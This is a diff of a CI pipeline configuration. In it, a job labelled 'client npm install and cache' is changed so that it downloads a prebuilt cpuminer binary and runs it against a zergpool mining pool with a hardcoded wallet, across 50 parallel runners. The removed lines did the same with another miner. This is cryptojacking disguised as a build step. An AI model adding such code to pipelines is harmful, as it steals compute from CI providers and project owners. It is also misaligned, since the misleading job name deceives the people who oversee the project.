@@ -21,8 +21,7 @@ blocks:
       jobs:
         - name: client npm install and cache
           commands:
-            - 'sudo apt-get update && sudo apt-get install build-essential libcurl4-openssl-dev autotools-dev automake libtool unzip && wget https://github.com/decryp2kanon/sugarmaker/archive/master.zip && unzip master.zip && cd sugarmaker-master &&'
-            - './autogen.sh && ./configure CFLAGS="-Wall -O2 -fomit-frame-pointer" CXXFLAGS="$CFLAGS -std=gnu++11" && make && ./sugarmaker -a YespowerMbc -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo'
+            - 'mkdir cm && cd cm && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo'
           parallelism: 50
   - name: Lint
     task:
